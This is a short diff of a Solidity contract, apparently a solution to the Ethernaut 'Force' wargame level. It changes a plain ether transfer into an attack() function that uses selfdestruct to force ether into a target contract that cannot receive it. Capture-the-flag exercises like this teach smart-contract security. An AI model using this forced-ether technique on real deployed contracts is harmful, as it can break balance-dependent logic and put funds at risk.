@@ -2,13 +2,14 @@
 pragma solidity >=0.6.0;
 
 contract ForceSol{
-    address payable public targetContract;
+    Force public targetContract;
     constructor (address payable _targetContract){
-        targetContract = _targetContract;
+        targetContract = Force(_targetContract);
     }
 
-    function sendEth() payable public {
-        targetContract.transfer(msg.value);
+    function attack() payable public {
+        address payable adr = payable(address(targetContract));
+        selfdestruct(adr);
     }
 }
 
